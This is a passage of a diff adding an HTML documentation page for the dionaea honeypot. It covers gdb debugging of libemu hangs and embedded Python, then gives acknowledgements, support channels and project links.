+#4  0x0805e8be in recurse_io_process (pd=0x87dc388, con=0x8864b58, dir=bistream_in) at processor.c:167
+No locals.
+#5  0x0805ea01 in processors_io_in_thread (data=0x8864b58, userdata=0x87dc388) at processor.c:197
+        con = (struct connection *) 0x8864b58
+        pd = (struct processor_data *) 0x87dc388
+        __PRETTY_FUNCTION__ = "processors_io_in_thread"
+#6  0x0805d2da in threadpool_wrapper (data=0x87d7bd0, user_data=0x0) at threads.c:49
+        t = (struct thread *) 0x87d7bd0
+        timer = (GTimer *) 0xb4108540
+#7  0xb77441f6 in g_thread_pool_thread_proxy (data=0x83db460) at gthreadpool.c:265
+        task = (gpointer) 0x87d7bd0
+        pool = (GRealThreadPool *) 0x83db460
+#8  0xb7742b8f in g_thread_create_proxy (data=0x83dc7d0) at gthread.c:635
+        __PRETTY_FUNCTION__ = "g_thread_create_proxy"
+#9  0xb76744c0 in start_thread () from /lib/i686/cmov/libpthread.so.0
+No symbol table info available.
+#10 0xb75f36de in clone () from /lib/i686/cmov/libc.so.6
+No symbol table info available.
+</pre>Again, it was a bug in libemu, an unbreakable loop consuming
+all memory. To reproduce, we have to dump the tested buffer,
+therefore we need the buffers address and size. Luckily the size is
+noted in frame #2 as 8196 and and the data address is a parameter
+which got not optimized out for frame #2.
+        <pre>
+dump binary memory /tmp/sc.bin 0xb411c698 0xb411e89c
+</pre>Afterwards, debugging libemu by feeding the data into sctest
+is easy.
+      </div><br />
+      I've had fun with objgraph and gdb debugging reference count
+      leaks in python too, <a href=
+      "http://carnivore.it/2009/12/23/arcane_bugs">here</a> is the
+      writeup.
+    </div>
+
+    <h5 id="gdb">gdb python3 embedded</h5>
+
+    <div class="level5">
+      Sometimes, there is something wrong with the python scripts,
+      but gdb does not provide any useful output:
+      <pre>
+bt full
+#12 0xb765f12d in PyEval_EvalFrameEx (f=0x825998c, throwflag=0) at Python/ceval.c:2267
+        stack_pointer = (PyObject **) 0x8259af0
+        next_instr = (unsigned char *) 0x812fabf "m'"
+        opcode = 100
+        oparg = &lt;value optimized out&gt;
+        why = 3071731824
+        err = 1
+        x = (PyObject *) 0xb7244aac
+        v = &lt;value optimized out&gt;
+        w = (PyObject *) 0xadb5e4dc
+        u = (PyObject *) 0xb775ccb0
+        freevars = (PyObject **) 0x8259af0
+        retval = (PyObject *) 0x0
+        tstate = (PyThreadState *) 0x809aab0
+        co = (PyCodeObject *) 0xb717b800
+        instr_ub = -1
+        instr_lb = 0
+        instr_prev = -1
+        first_instr = (unsigned char *) 0x812f918 "t"
+        names = (PyObject *) 0xb723f50c
+        consts = (PyObject *) 0xb71c9f7c
+        opcode_targets = {0xb765d202, 0xb765f60a, 0xb766133a, 0xb76612db, 0xb7661285, 0xb7661222, 0xb765d202, 0xb765d202, 0xb765d202, 0xb76611dd,
+  0xb766114b, 0xb76610b9, 0xb766100f, 0xb765d202, 0xb765d202, 0xb7660f7d, 0xb765d202, 0xb765d202, 0xb765d202, 0xb7660eb7, 0xb7660dfb, 0xb765d202,
+  0xb7660d30, 0xb7660c65, 0xb7660ba9, 0xb7660aed, 0xb7660a31, 0xb7660975, 0xb76608b9, 0xb76607fd, 0xb765d202 &lt;repeats 24 times&gt;, 0xb7660736, 0xb766066b,
+  0xb76605af, 0xb76604f3, 0xb765d202, 0xb7660437, 0xb766035d, 0xb76602ad, 0xb7661aba, 0xb76619fe, 0xb7661942, 0xb7661886, 0xb7661b76, 0xb76614a8,
+  0xb7661413, 0xb766138e, 0xb766171f, 0xb76616e6, 0xb765d202, 0xb765d202, 0xb765d202, 0xb766162a, 0xb766156e, 0xb76601f1, 0xb7660135, 0xb76617ca,
+  0xb7660120, 0xb765fff7, 0xb765d202, 0xb765fd72, 0xb765fc6e, 0xb765d202, 0xb765fc1d, 0xb765fe17, 0xb765fd90, 0xb765fec0, 0xb765fb41, 0xb765fadc,
+  0xb765f9ed, 0xb765f94d, 0xb765f8be, 0xb765f7e3, 0xb765f779, 0xb765f6bd, 0xb765f66c, 0xb765ef1d, 0xb765eea2, 0xb765ede1, 0xb765ed1a, 0xb765ec35,
+  0xb765ebc3, 0xb765eb30, 0xb765ea69, 0xb765f1c7, 0xb765f027, 0xb765f560, 0xb765efc1, 0xb76630e3, 0xb766310c, 0xb765e64c, 0xb765e592, 0xb765f49a,
+  0xb765f3de, 0xb765d202, 0xb765d202, 0xb765f39e, 0xb7663135, 0xb766315f, 0xb765e9cb, 0xb765d202, 0xb765e948, 0xb765e8bb, 0xb765e817, 0xb765d202,
+  0xb765d202, 0xb765d202, 0xb765d2ae, 0xb765e3e0, 0xb7663275, 0xb765e1a2, 0xb766324e, 0xb765e0ba, 0xb765e01e, 0xb765df74, 0xb765d202, 0xb765d202,
+  0xb7663189, 0xb76631d3, 0xb7663220, 0xb765e149, 0xb765d202, 0xb765de09, 0xb765dec0, 0xb765f2c0, 0xb765d202 &lt;repeats 108 times&gt;}
+#13 0xb7664ac0 in PyEval_EvalCodeEx (co=0xb717b800, globals=0xb7160b54, locals=0x0, args=0x84babb8, argcount=9, kws=0x0, kwcount=0, defs=0xb719e978,
+    defcount=1, kwdefs=0x0, closure=0x0) at Python/ceval.c:3198
+        f = (PyFrameObject *) 0x825998c
+        retval = &lt;value optimized out&gt;
+        freevars = (PyObject **) 0x8259af0
+        tstate = (PyThreadState *) 0x809aab0
+        x = &lt;value optimized out&gt;
+        u = &lt;value optimized out&gt;
+</pre>Luckily python3 ships with some gdb macros, which assist in
+dealing with this mess. You can grab them over <a href=
+"http://svn.python.org/view/python/tags/r311/Misc/gdbinit?view=markup">
+      here</a>, place them to ~/.gdbinit, where ~ is the
+      homedirectory of the user dionaea runs as.<br />
+      If you get <em><strong>warning: not using untrusted file
+      "/home/user/.gdbinit"</strong></em> you are running gdb via
+      sudo, and the file /home/user/.gdbinit has to be owned by
+      root.<br />
+      If you are running as root, and you get <em><strong>Program
+      received signal SIGTTOU, Stopped (tty output).</strong></em>,
+      run stty -nostop before running gdb, reattach the process
+      with fg, close gdb properly, and start over.<br />
+      <br />
+      Once you got the macros loaded properly at gdb startup, set a
+      breakpoint on PyEval_EvalFrameEx after dionaea loaded
+      everything:
+      <pre>
+break PyEval_EvalFrameEx
+</pre>Then we have some useful macros for gdb:
+      <pre>
+up
+pyframev
+</pre>pyframev combines the output of pyframe and pylocals.<br />
+
+      <br />
+      Be aware you can segfault dionaea now from within gdb, going
+      up, out of the python call stack and calling some of the
+      macros can and in most cases will segfault dionaea, therefore
+      use backtrace to make sure you are still within valid
+      frames.<br />
+      We can't use pystack or pystackv as they rely on Py_Main,
+      which is an invalid assumption for embedded python.<br />
+    </div>
+
+    <h2 id="honorem">Cui honorem, honorem</h2>
+
+    <table>
+      <tr>
+        <td><img src="images/surfnet_logo.gif" alt=
+        "surfnet" /></td>
+
+        <td>SURFnet always supported us.<br />
+        Working with SURFnet is a real pleasure.</td>
+      </tr>
+    </table>
+
+    <h2 id="support">Support</h2>
+
+    <div class="level2">
+      If you are getting frustrated, because things to not work for
+      you and you already read the <a href="#FAQ">FAQ</a>, join the
+      ml and share your experience, or the chat.
+
+      <ul>
+        <li><a href=
+        "https://lists.sourceforge.net/lists/listinfo/nepenthes-devel">
+        Mailing List</a></li>
+
+        <li><a href="irc://irc.freenode.org/nepenthes">Chat
+        (freenode, #nepenthes)</a></li>
+      </ul>
+    </div>
+
+    <h2 id="links">Links</h2>
+
+    <ul>
+      <li><a href="http://honeynet.org/gsoc/project10">GSoC Project
+      #10</a></li>
+
+      <li><a href=
+      "http://socghop.appspot.com/document/show/program/google/gsoc2009/timeline">
+      GSoC Timeline</a></li>
+
+      <li><a href="http://honeynet.org/">The Honeynet
+      Project</a></li>
+    </ul>
+  </div><!-- vim: set et ts=2 sw=2: -->
+</body>
+</html>
